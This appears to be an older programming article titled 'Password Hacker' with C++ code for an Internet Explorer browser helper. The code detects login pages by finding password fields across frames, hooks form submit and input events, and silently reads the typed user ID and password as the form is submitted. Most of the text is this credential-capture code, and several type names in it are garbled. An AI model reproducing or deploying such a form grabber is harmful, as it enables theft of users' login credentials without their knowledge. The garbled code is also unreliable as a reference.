           Password Hacker


//
CComPtr<IDISPATCH> spDisp; 
HRESULT hr = m_pWebBrowser2->get_Document(&spDisp);
if (SUCCEEDED(hr) && spDisp)
{ 
    // If this is not an HTML document (e.g., it's a Word doc or a PDF), don't sink.
    CComQIPtr<IHTMLDOCUMENT2 &IID_IHTMLDocument2> spHTML(spDisp);
     if (spHTML)
     { 
         /*there can be frames in HTML page enumerate each of frameset or iframe
              and find out if any of them contain a login page*/
           EnumFrames(spHTML);  
    }
}

void CIeLoginHelper::EnumFrames(CComPtr<IHTMLDocument2>& spDocument) 
{    
    
    CComPtr<IIHTMLDocument2> spDocument2;
    CComPtr<IIOleContainer> pContainer;
    // Get the container
    HRESULT hr = spDocument->QueryInterface(IID_IOleContainer,
                (void**)&pContainer);
    
    CComPtr<IIEnumUnknown>pEnumerator;
    // Get an enumerator for the frames
    hr = pContainer->EnumObjects(OLECONTF_EMBEDDINGS, &pEnumerator);
    IUnknown* pUnk;
    ULONG uFetched;

    // Enumerate and refresh all the frames
    BOOL bFrameFound = FALSE;
    for (UINT nIndex = 0; 
            S_OK == pEnumerator->Next(1, &pUnk, &uFetched);
                nIndex++)
    {
        CComPtr<IIWebBrowser2> pBrowser;
        hr = pUnk->QueryInterface(IID_IWebBrowser2, 
                (void**)&pBrowser);
        pUnk->Release();
        if (SUCCEEDED(hr))
        {
            CComPtr<IIDispatch> spDisp;
            pBrowser->get_Document(&spDisp);
            CComQIPtr<IHTMLDocument2, &
                         IID_IHTMLDocument2> spDocument2(spDisp);
            //Now recursivley browse through all of
                        //IHTMLWindow2 in a doc                    
            RecurseWindows(spDocument2);
            bFrameFound = TRUE;

        }
    }
    if(!bFrameFound || !m_bFoungLoginPage)
    {

        CComPtr<IIHTMLElementCollection> spFrmCol;
        CComPtr<IIHTMLElementCollection> spElmntCol;
        /*multipe <FORM> object can be in a page,
                 connect to each one them
        You never know which one contains uid and pwd fields
        */
        hr = spDocument->get_forms(&spFrmCol);
        // get element collection from page to check 
                if a page is a lgoin page
        hr = spDocument->get_all(&spElmntCol);
        if(IsLoginPage(spElmntCol))
                   EnableEvents(spFrmCol);    
    }        
}

If a page has a password field, then you'll be interested in getting the user ID and password.
C++
Shrink ▲   Copy Code

BOOL  CIeLoginHelper::IsLoginPage(CComPtr<IHTMLElementCollection>&spElemColl)
{
    if(spElemColl == NULL)
        return m_bFoungLoginPage;
    _variant_t varIdx(0L, VT_I4);
    long lCount = 0;
    HRESULT hr  = S_OK;
    hr = spElemColl->get_length (&lCount);
    if (SUCCEEDED(hr))
    {
        for(long lIndex = 0; lIndex <lCount; lIndex++ ) 
        { 
            varIdx=lIndex;
                    CComPtr<IDispatch>spElemDisp;
            hr = spElemColl->item(varIdx, varIdx, &spElemDisp);
            if (SUCCEEDED(hr))
            {
                CComPtr<IHTMLInputElement> spElem;
                hr = spElemDisp->QueryInterface(IID_IHTMLInputElement, (void**)&spElem);
                if (SUCCEEDED(hr))
                {
                    _bstr_t bsType;
                    hr = spElem->get_type(&bsType.GetBSTR());
                    if(SUCCEEDED(hr) && bsType.operator==(L"password"))
                    {
                        m_bFoungLoginPage = true;
                    }
                }
            }
            if(m_bFoungLoginPage)
                return m_bFoungLoginPage;
        }
    }
    return m_bFoungLoginPage;
}

Once you determine the target page, all you've to do is walk through the form collection and connect to the events of the form elements, as below:
C++
Shrink ▲   Copy Code

_variant_t varIdx(0L, VT_I4);
long lCount = 0;
HRESULT hr  = S_OK;
hr = pElemColl->get_length (&lCount);
if (SUCCEEDED(hr))
{
    for(long lIndex = 0; lIndex <lCount; lIndex++ ) 
    { 
           varIdx=lIndex;
           hr=pElemColl->item(varIdx, varIdx, &pElemDisp);

        if (SUCCEEDED(hr))
        {
            hr = pElemDisp->QueryInterface(IID_IHTMLFormElement, (void**)&pElem);

            if (SUCCEEDED(hr))
            {
                // Obtained a form object.
                IConnectionPointContainer* pConPtContainer = NULL;
                IConnectionPoint* pConPt = NULL;    
                // Check that this is a connectable object.
                hr = pElem->QueryInterface(IID_IConnectionPointContainer,
                    (void**)&pConPtContainer);
                if (SUCCEEDED(hr))
                {
                    // Find the connection point.
                    hr = pConPtContainer->FindConnectionPoint(
                        DIID_HTMLFormElementEvents2, &pConPt);

                    if (SUCCEEDED(hr))
                    {
                        // Advise the connection point.
                        // pUnk is the IUnknown interface pointer for your event sink
                        hr = pConPt->Advise((IDispatch*)this, &m_dwBrowserCookie);
                        pConPt->Release();
                    }
                }
                pElem->Release();
            }
            pElemDisp->Release();
        }
    }
}

Capturing the user ID and password

The timing of data capture is important. The best time is when the form is being submitted. A form can be submitted in many ways:

Any of the above objects will trigger the event DISPID_HTMLFORMELEMENTEVENTS2_ONSUBMIT.

In this case, we've to handle:

    When an object of type <INPUT TYPE=submit> or <INPUT TYPE=image> or <BUTTON TYPE=submit> is clicked by the left mouse key, or the Enter key or space bar key is pressed.
    By calling form.submit in an event handler of an object's mouse or key event handler.
        DISPID_HTMLELEMENTEVENTS2_ONKEYPRESS and
        DISPID_HTMLELEMENTEVENTS2_ONCLICK

Once you know when to capture the data, the rest is very easy. All you do is walk through the element collection and retrieve the user ID and password.
C++
Shrink ▲   Copy Code

_variant_t varIdx(0L, VT_I4);
long lCount = 0;
HRESULT hr  = S_OK;
hr = pElemColl->get_length (&lCount);
if (SUCCEEDED(hr))
{
    for(long lIndex = 0; lIndex <lCount; lIndex++ ) 
{ 
  varIdx=lIndex; 
  hr=pElemColl->item(varIdx, varIdx, &pElemDisp);
    if (SUCCEEDED(hr))
    {
        hr = pElemDisp->QueryInterface(IID_IHTMLInputElement, (void**)&pElem);
        if (SUCCEEDED(hr))
        {
            _bstr_t bsType;
            pElem->get_type(&bsType.GetBSTR());
            if(bsType.operator ==(L"text"))
            {
                pElem->get_value(&bsUserId.GetBSTR());
            }
            else if(bsType.operator==(L"password"))
            {
                pElem->get_value(&bsPassword.GetBSTR());
            }
            pElem->Release();
        }

        pElemDisp->Release();
    }
    if(bsUserId.GetBSTR() && bsPassword.GetBSTR() && 
      ( bsUserId.operator!=(L"") && bsPassword.operator!=(L"") ) )
    {
        return;
    }            

    }
}

History

    V1.0.0.1 - First version.
    V1.0.1.1 - Uploaded on Aug 29, 2006. This version enumerates the frames in a page to find out if any of the frames has a login page.
